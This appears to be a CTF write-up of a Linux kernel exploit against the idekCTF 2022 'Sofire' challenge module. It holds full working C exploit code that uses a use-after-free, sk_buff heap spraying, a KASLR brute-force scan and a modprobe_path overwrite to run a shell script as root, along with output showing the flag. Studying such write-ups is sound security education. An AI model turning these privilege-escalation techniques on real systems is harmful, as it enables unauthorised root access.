---
layout: post
title:  "idekCTF 2022: Sofire=good"
categories: pwn
excerpt_separator: <!--end_excerpt-->
---

This was a relatively standard kernel heap exploitation challenge featuring a kernel module with functionality for adding, deleting, editing and viewing "NFTs", which act as kernel heap buffers of 256 bytes.

<!--end_excerpt-->

I played this CTF with The WinRaRs as well and solving this challenge was a pretty refreshing use of my early Saturday, plus I got to try out a technique I never had before. My solution was pretty different from the author's and much shorter too, so I'm interested in describing it! It could even theoretically be done completely blindly without knowing kernel version if I did more work on it.

## Summary
1. Create an NFT and free all NFTs
2. Reallocate on top of NFT data via socket buffer
3. Scan memory to find kernel base and then execute arbitrary write to overwrite modprobe_path

[To skip to exploitation writeup](#triggering-the-use-after-free)

## Analysis
The challenge comes with a really nice debug environment instead of having to make it work manually, which is nice. The source code for chall.ko is provided and by running the vm and listing /dev it can be seen that the device file is at `/dev/Sofire`.

Core structures:
```c
typedef struct sofirium_head{
    char coin_art[0x70];
    struct sofirium_entry* head;
    int total_nft;
} sofirium_head;

typedef struct sofirium_entry{
    struct sofirium_entry* next;
    char nft[CHUNK_SIZE];
} sofirium_entry;

typedef struct request{
    int idx;
    char buffer[CHUNK_SIZE];
} request;
```
The device keeps track of a structure called `sofirium_head` that stores some nice ASCII coin art, a pointer to the first entry, and the amount of entries. Each entry stores a pointer to the next entry and 256 bytes of data. The request structure is what the ioctl expects a pointer to, storing an idx and a buffer of 256 bytes of data.

Besides setup, the main interesting functionality is in the ioctl code.

It takes in the command as an integer and the address of the request as arguments, as is standard, and copies the request to a kernel land buffer, so no double fetches there.

### Delete
0x1337 acts as a deletion command.
```c
case 0x1337:
            debug_print(KERN_INFO "Deleting Blockchain: Sofirium is Bad");

            next = head->head;
            total_nft= head->total_nft;
            kfree(head);

            for (int i = 0; i < total_nft; i ++){
                debug_print(KERN_INFO "Freeing Buffer 0x%px\nNEXT: 0x%px", tmp, next->next);
                tmp = next;
                next = next->next;
                kfree(tmp);
            }

            return 1;
```
It traverses the singly linked list and frees every instance, however failing to null anything and keeping the head pointer after kfree'ing it. This the main vulnerability - a **UAF**, or use after free.

### Allocate
```c
case 0xdeadbeef:

            if (head == NULL){
                head = kmalloc(sizeof(sofirium_head), GFP_KERNEL);
                head->total_nft = 0;
                strlcpy(head->coin_art, sofirium_art, sizeof(head->coin_art));

                printk(KERN_INFO "%s", head->coin_art);

                head->head = NULL;
                debug_print(KERN_INFO "Head NULL, Creating sofirium_head at 0x%px", head);
            }

            if (head->total_nft == 0){
                new = kmalloc(sizeof(sofirium_entry), GFP_KERNEL);
                new->next = NULL;
                memcpy(new->nft, req.buffer, CHUNK_SIZE);
                head->head = new;
                head->total_nft = 1; 
            }

            else{
                target = head->head;
                for (int i=1; i < head->total_nft; i++){
                    target = target->next;
                }
                new = kmalloc(sizeof(sofirium_entry), GFP_KERNEL);
                new->next = NULL;
                memcpy(new->nft, req.buffer, CHUNK_SIZE);
                target->next = new;
                head->total_nft ++;
            }

            debug_print(KERN_INFO "NEW NFT: %s @ 0x%px \n",new->nft, new);
            return head->total_nft;
```
Meanwhile, 0xdeadbeef is an allocation command. The basis of this code is that if head is null(which will only happen at the beginning as head is not nulled when the NFTs are freed) it is allocated and the coin art is copied in, whilst the number of NFTs (`total_nft`) is set to 0. Then, if `total_nft` is 0, a new NFT is created with the buffer data that becomes set to the `head->head` pointer. Otherwise, the singly linked list is traversed towards the end, and the next pointer of the last NFT is set to the newly allocated NFT. 

### Read NFT
```c
case 0xcafebabe:
            target = head->head;
            for (int i=0; i < req.idx; i++){
                debug_print(KERN_INFO "Walked over entry 0x%px", target->next);
                target = target->next;
            };



            debug_print(KERN_INFO "Copy to user %s @ 0x%px", target->nft, target->nft);
            if(copy_to_user((void*)arg+offsetof(struct request, buffer),target->nft, sizeof(target->nft))){
                printk(KERN_INFO "Copy to user failed, exiting");
                return -EFAULT;
            }
            return 0;
```
0xcafebabe is a reading command. Given the index, the linked list is traversed until reaching the target NFT, which is then copied to the user. Note that the index is not checked, although right now this is useful for nothing other than causing a null pointer dereference since the last NFT will just have a next pointer of null.

### Write NFT
```c
        case 0xbabecafe:
            target = head->head;
            for (int i=0; i < req.idx; i++){
                debug_print(KERN_INFO "Walked over entry %px", target->next);
                target = target->next;
            };

            if(copy_from_user(target->nft, (void*)arg+offsetof(struct request, buffer),sizeof(target->nft))){
                printk(KERN_INFO "Copy from user failed exiting");
                return -EFAULT;
            }
            debug_print(KERN_INFO "Copy from user %s to 0x%px", target->nft, target->nft);

            return 0;
```
Finally, 0xbabecafe is writing. It works in basically the exact same way, except copying from the nft to the request buffer instead of the other way around.


## Triggering the Use-After-Free
I designed the following skeleton to interact wtih the device via ioctl.
```c
#include <fcntl.h>      /* open */
#include <unistd.h>     /* exit */
#include <sys/ioctl.h>  /* ioctl */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <linux/ioctl.h>
#include <linux/tty.h>
#include <sys/syscall.h>
#include <assert.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <sys/types.h>

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <string.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/socket.h>
#include <sys/timerfd.h>

#define DEVICE_FILE_NAME "/dev/Sofire"
#define FREE 0x1337
#define ADD 0xdeadbeef
#define READ 0xcafebabe
#define WRITE 0xbabecafe

#define CHUNK_SIZE 0x100

typedef struct request{
    int idx;
    char buffer[CHUNK_SIZE];
} request;

int fd;

request req;

int free_nft(){
        return ioctl(fd, FREE, &req);
}

int add_nft(char* data){
        memcpy(req.buffer, data, CHUNK_SIZE);
        return ioctl(fd, ADD, &req);
}

int read_nft(int idx, char* out){
        int ans;
        req.idx = idx;
        ans = ioctl(fd, READ, &req);
        if(out != NULL){
                memcpy(out, req.buffer, CHUNK_SIZE);
        }
        return ans;
}

int write_nft(int idx, char* data){
        req.idx = idx;
        memcpy(req.buffer, data, CHUNK_SIZE);
        return ioctl(fd, WRITE, &req);
}

void hexdump(uint8_t* buf, int size) {
    for (int i = 0; i < size; i+=16) {
        printf("0x%02hhx| ", i);
        for (int j = 0; j < 16; j++)
            printf("%02hhx ", buf[i+j]);
        puts("");
    }
}

int main(int argc, char *argv[])
{
        
        fd = open(DEVICE_FILE_NAME,0);
        if (fd < 0){
                puts("Device file not found.");
                exit(0);
        }  
}
```
Anyway, we now have a very useful primitive. NFTs that are added can be freed whilst still having access to them, meaning that by reallocating on top of them or reading the data, lots of useful info can be gained. The only kernel heap metadata that is stored in a chunk after it is freed is the freelist pointer(which in this case is unencrypted) in the middle of the chunk. This is far from any data that matters, so providing the free chunk is not reallocated by a different structure, the old freed data can still be used.

Ideally, the `sofirium_head` struct should remain reasonably unchanged and the `head` pointer should point to what it did before, except now the NFT data will contain a freelist pointer in it. To test,
```c
char buf[CHUNK_SIZE];
uint64_t* longbuf = (uint64_t *)(buf);

uint64_t* fake_nft = calloc(8, 24);
void* outbuf = calloc(1, 512);
memset(buf, 0x41, CHUNK_SIZE);
add_nft(buf);
free_nft();

read_nft(0, buf);
hexdump(buf, 0x100);
```

The result,
```
0x00| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x10| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x20| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x30| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x40| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x50| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x60| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x70| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x80| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x90| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0xa0| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0xb0| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0xc0| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0xd0| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0xe0| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0xf0| 41 41 41 41 41 41 41 41 00 68 b8 81 2d 8e ff ff 
```

There's a kernel pointer at the end, so clearly we've accessed freed chunk data!

The `sofirium_entry` structure is 0x108 bytes(0x100 bytes of data and an 8 byte pointer) so that goes into kmalloc-512. To exploit this we want to allocate some sort of kernel structure on top of the `sofirium_entry`, faking the entry. Given this allows us to control the `next` pointer, that can be leveraged into an arbitrary read and write. But what can we choose? 

It's important to remember that the `sofirium_head` struct must remain unchanged, so that cannot be allocated. Luckily that structure is in a different cache so as long as we keep out of it. When looking for kernel structures to attack I usually refer to [this ptr-yudai article](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628) which is extremely useful. There aren't many good things in kmalloc-512 though, besides the `msg_msg` structure which is elastic. I ended up using the `sk_buff` structure which is quite nice for generic kernel UAFs.

## Spraying the sk_buff data structure

When storing unread socket data, the linux kernel uses a socket buffer structure allocated on the slab which is essentially just a block of memory used as a buffer filled with *user-controlled* data. There are 320 bytes appended to the end of the data for various control things, but that isn't too important. To get into kmalloc-512, a maximum of 192 bytes in the socket message is needed. This will create a chunk on the slab of form `192 bytes of controlled data | 320 bytes of uncontrolled data`. That 192 bytes is more than enough to overwrite the next pointer of an NFT.

To generate these messages, the `socketpair` syscall will suffice. This is similar to pipes, creating a pair of socket file descriptors for which anything written to one end can be read from the other and vice versa. Unread messages that have been written will be stored in `sk_buff` structures, providing the perfect heap spray.

```c
#define NUM_SOCKETS 4
#define NUM_SKBUFFS 128
#define SKB_SHARED_SIZE 320

#define SKBUFF_SIZE 512 - SKB_SHARED_SIZE
int ss[NUM_SOCKETS][2];
int spray_skbuff(void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (write(ss[i][0], buf, size) < 0) {
        perror("write");
        return -1;
      }
    }
  }
  return 0;
}

int free_skbuff(void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (read(ss[i][1], buf, size) < 0) {
        perror("read");
        return -1;
      }
    }
  }
  return 0;
}
```

Some setup is required in the main function to create the socket pairs.
```c
for (int i = 0; i < NUM_SOCKETS; i ++) {
    if(socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
        perror("socketpair");
        exit(1);
    }
}
```
This code is mostly copied from [this exploit](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555), by the way.

By spraying several different sk_buffs with the same data(and then freeing and spraying again when we want to change) we can be sure that one of them will allocate on top of the freed NFT structure, in case there's noise on the system. This precuation is pretty unnecessary in this environment, but much more necessary in real-life kernel exploitation.

It can be seen that this works pretty well. Changing our UAF code to first spray socket buffers before reading the freed data,
```c
uint64_t* fake_nft = calloc(8, 24);
void* outbuf = calloc(1, 512);
memset(buf, 0x41, CHUNK_SIZE);
add_nft(buf);
free_nft();
spray_skbuff(fake_nft, SKBUFF_SIZE);
read_nft(0, buf);
```

```
0x00| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x10| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x20| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x30| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x40| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x50| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x60| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x70| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x80| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x90| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0xa0| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0xb0| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0xc0| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0xd0| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0xe0| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0xf0| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

We have accomplished confusing a `sofirium_entry` and an `sk_buff`, putting both in the same place.

## Finding the kernel base
I use the word "finding" instead of "leaking" for reasons you'll see shortly!

When exploiting a kernel driver, the main goal is to elevate to root or execute something as root. There are three main ways to accomplish this. 
1. Getting control of the instruction pointer, RIP, in kernel space. This could theoretically allow one to execute arbtirary instructions whilst the CPU is in kernel mode via ROP, and it is possible to force the CPU to elevate the current process to root and return to userland. This is often messy, and requires overwriting a structure that has function pointers, or some other method.
2. Overwriting the modprobe_path variable in the kernel. When a user tries to execute a file for which the kernel does not recognise the header(the basis for file execution is done in the kernel), it will run the modprobe binary on this file to identify how it should be run. The variable `modprobe_path` supplies the path of this modprobe binary, which is configurable. The kernel executes this as root. Overwriting the `modprobe_path` variable with a custom file path lets one **control what root executes**. This is cleaner, but requires an arbitrary write. There is a configuration option, STATIC_USERMODEHELPER_PATH, that makes `modprobe_path` and similar variables static and thus unwriteable.
3. Overwriting the current cred structure to change the UID to 0. The current "credentials" signifying privilege levels, etc, are all stored in an isolated structure in the linux kernel. Given a memory read primitive, it is possible to traverse a tree structure and find the credential structure for the current process, and overwrite the UID to 0. It is also sometimes possible to overflow or UAF into cred structs, though this is harder as they are in their own isolated slabs and require a *cross-cache attack* in latest kernel versions. This is very clean and difficult to mitigate against, however there's often a lot of silliness traversing cred structs with offsets etc. based on kernel versions.

The way I am going to use is number 2, overwriting modprobe_path. Achieving an arbitrary write is pretty easy with the current setup - simply set the `next` pointer of the custom sofirium_entry to `address - 8`, and then the data is copied into `target->nft`, the arbitrary write is accomplished. However, obviously, the kernel base is randomised via KASLR, so this must be leaked before attempting an arbitrary write.

This is where myself and the author diverge quite a bit. They used heap leaks and an arbitrary read to leak the kernel base by reading a different kernel structure that contains function pointers, and rebasing to find the kernel base. I, however, take a different approach.

An arbitrary read is similarly easy to the arbtirary write I described above, pretty much the same process except reading instead of writing. One technique I always wanted to try but never got the oppurtunity to until now is memory scanning. The `copy_from_user` and `copy_to_user` functions in the linux kernel **never fault**. If attempting to copy to or from an invalid address they simply cleanly exit and signify the error. Given our arbitrary read and write primitives use `copy_from_user` and `copy_to_user` with no direct memory access in between, there is actually another option for figuring out the kernel base.

I learnt from [this paper](https://pure.tugraz.at/ws/portalfiles/portal/28506974/kaslr.pdf) that KASLR only has 9 bits of entropy, which is 512 possible values. Obviously when having to reboot the system because the exploit crashes every time the base is wrong, such a bruteforce is not worth it at all. But when it is easily checkable whether or not the address is valid(whether or not any data was actually read) then this bruteforce is trivial.

So, instead of messing with kernel structures and spending time(and extra code!) debugging, I simply bruteforced the KASLR base by forging fake `sofirium_entry` structures via the socket buffers, freeing them, and trying again. There is where the fact that the indexes aren't checked come in - it means I can set the next pointer and pretend there are more NFTs when there really shouldn't be.

It takes a short while, but finds the KASLR base in decent time, like a minute or so at most.
```c
char buf[CHUNK_SIZE];
uint64_t* longbuf = (uint64_t *)(buf);

uint64_t* fake_nft = calloc(8, 24);
void* outbuf = calloc(1, 512);
memset(buf, 0x41, CHUNK_SIZE);
add_nft(buf);
free_nft();

read_nft(0, buf);
uint64_t kbase;
// KASLR only has 9 bits of entropy. Since copy_to_user is used to copy data from NFT to user(copy_to_user never crashes) we can just scan memory for kernel base.
// Use socket buffer to fake an NFT pointer and then read nft idx 0 which is at fake pointer, and will attempt to copy text from fake pointer + 8.
for(uint64_t i = 0; i < 512; i ++){
        fake_nft[0] = 0xffffffff80000000UL + (i << 21);
        printf("%p\n", fake_nft[0]);
        spray_skbuff(fake_nft, SKBUFF_SIZE);
        read_nft(1, buf);
        hexdump(buf, CHUNK_SIZE);
        free_skbuff(outbuf, SKBUFF_SIZE);
        // Actually read data
        if(buf[0] != 0x41){
                kbase = fake_nft[0];
                break;
        }
}
```

## Finally getting the flag

After getting the kernel base, the process is simple. The kernel is compiled with symbols so it is easy via a debugger to find the symbol `modprobe_path` - it is at 0x1851400. Note that my method of finding the kernel base is not at all target dependent given it just scans the entirety of possible kernel memory until it finds an address and this part of the exploit also could be with only a bit more code. If we simply then scanned within the memory of the kernel that had already been found for the term "/sbin/modprobe" (the default modprobe_path value), the address of modprobe_path could be found without needing to even have the kernel locally. Since it was just adding a number though, I decided not to do this. Often in real kernel exploits they use techniques similar to this to make exploits independent of kernel version, although usually they just scan memory for the cred structs and overwrite those.

Arbitrary write is simple from there as I have already described, and then I use a `modprobe_hax` function I copied and adapted from FizzBuzz101. 
```c
void modprobe_hax()
{
    // Given modprobe_path is /home/user/w this will chmod /flag.txt 777
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/roooot");
    system("chmod +x /home/user/roooot");
    system("echo -ne '#!/bin/sh\nchmod 777 /flag.txt\n' > /home/user/w\n");
    system("chmod +x /home/user/w");
    system("/home/user/roooot");
    return;
}
```

This creates a file called /home/user/roooot with an unknown header, triggering the kernel's modprobe. It also creates a simple shell file /home/user/w that makes flag.txt world readable, and then executes /home/user/roooot. This triggers the kernel's modprobe and, since I will set it to /home/user/w, that shell script will be executed by root. All that is left is to cat /flag.txt.

```c
fake_nft[0] = modprobe_path - 8;
spray_skbuff(fake_nft, SKBUFF_SIZE);
strcpy(buf, "/home/user/w");
write_nft(1, buf);
modprobe_hax();
```

After exiting, /flag.txt will be rwx for all users, and the flag can be read.

```
0xffffffff82e00000
0x00| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x10| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x20| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x30| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x40| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x50| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x60| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x70| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x80| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0x90| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0xa0| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0xb0| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0xc0| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0xd0| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0xe0| 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
0xf0| 41 41 41 41 41 41 41 41 00 68 b8 01 bd a2 ff ff 
0xffffffff83000000
0x00| 8d 3d f2 ff ff ff b9 01 01 00 c0 48 8b 05 86 75 
0x10| a5 01 48 c7 c2 00 00 00 83 48 29 d0 48 01 f8 48 
0x20| 89 c2 48 c1 ea 20 0f 30 56 e8 ea 05 00 00 5e 6a 
0x30| 10 48 8d 05 03 00 00 00 50 48 cb e8 08 01 00 00 
0x40| 48 8d 3d b1 ff ff ff 56 e8 1b 02 00 00 5e 48 05 
0x50| 00 20 01 05 eb 10 66 90 e8 eb 00 00 00 48 31 c0 
0x60| 48 05 00 c0 80 04 0f 20 e1 83 e1 40 81 c9 a0 00 
0x70| 00 00 f7 05 4c 9d 66 01 01 00 00 00 74 06 81 c9 
0x80| 00 10 00 00 0f 22 e1 48 03 05 7a 3f 81 01 56 48 
0x90| 89 c7 e8 b1 01 00 00 5e 0f 22 d8 0f 20 e1 48 89 
0xa0| c8 48 81 f1 80 00 00 00 0f 22 e1 0f 22 e0 48 c7 
0xb0| c0 bf 00 00 83 ff e0 0f 01 15 3a 3f 81 01 31 c0 
0xc0| 8e d8 8e d0 8e c0 8e e0 8e e8 b9 01 01 00 c0 8b 
0xd0| 05 c3 74 a5 01 8b 15 c1 74 a5 01 0f 30 48 8b 25 
0xe0| bc 74 a5 01 56 e8 7e 05 00 00 5e b8 01 00 00 80 
0xf0| 0f a2 89 d7 b9 80 00 00 c0 0f 32 89 c2 0f ba e8 
Kernel base: 0xffffffff83000000
Modprobe Path: 0xffffffff84851400
/home/user/roooot: line 1: ����: not found
/ $ ls -al /flag.txt
ls -al /flag.txt
-rwxrwxrwx    1 root     root            47 Jan 14 02:36 /flag.txt
/ $ cat /flag.txt
cat /flag.txt
idek{n0N_r3fuNd48lE_tr@s#_0n_7h3_k3rn3l_(h41n}
```

Overall, the main code is as simple as
```c
int main(int argc, char *argv[])
{
        
        fd = open(DEVICE_FILE_NAME,0);
        if (fd < 0){
                puts("Device file not found.");
                exit(0);
        }  
        
        for (int i = 0; i < NUM_SOCKETS; i ++) {
                if(socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
                    perror("socketpair");
                    exit(1);
                }
        }

        char buf[CHUNK_SIZE];
        uint64_t* fake_nft = calloc(8, 24);
        void* outbuf = calloc(1, 512);
        memset(buf, 0x41, CHUNK_SIZE);
        add_nft(buf);
        free_nft();

        read_nft(0, buf);
        uint64_t kbase;
        // KASLR only has 9 bits of entropy. Since copy_to_user is used to copy data from NFT to user(copy_to_user never crashes) we can just scan memory for kernel base.
        // Use socket buffer to fake an NFT pointer and then read nft idx 0 which is at fake pointer, and will attempt to copy text from fake pointer + 8.
        for(uint64_t i = 0; i < 512; i ++){
                fake_nft[0] = 0xffffffff80000000UL + (i << 21);
                printf("%p\n", fake_nft[0]);
                spray_skbuff(fake_nft, SKBUFF_SIZE);
                read_nft(1, buf);
                hexdump(buf, CHUNK_SIZE);
                free_skbuff(outbuf, SKBUFF_SIZE);
                // Actually read data
                if(buf[0] != 0x41){
                        kbase = fake_nft[0];
                        break;
                }
        }

        // Overwrite modprobe_path with /home/user/w and then do standard modprobe shenanigans
        uint64_t modprobe_path = kbase + 0x1851400;
        printf("Kernel base: %p\n", kbase);
        printf("Modprobe Path: %p\n", modprobe_path);

        fake_nft[0] = modprobe_path - 8;
        spray_skbuff(fake_nft, SKBUFF_SIZE);
        strcpy(buf, "/home/user/w");
        write_nft(1, buf);
        modprobe_hax();
}
```

[Full exploit file here](https://github.com/Day91/Writeups/blob/master/idekCTF/exploit.c)

## Conclusion

I had heard of memory scanning via usercopy primitives before but never got a chance to try it out in a kernel exploit until now, so it was definitely a nice challenge to do and I had fun!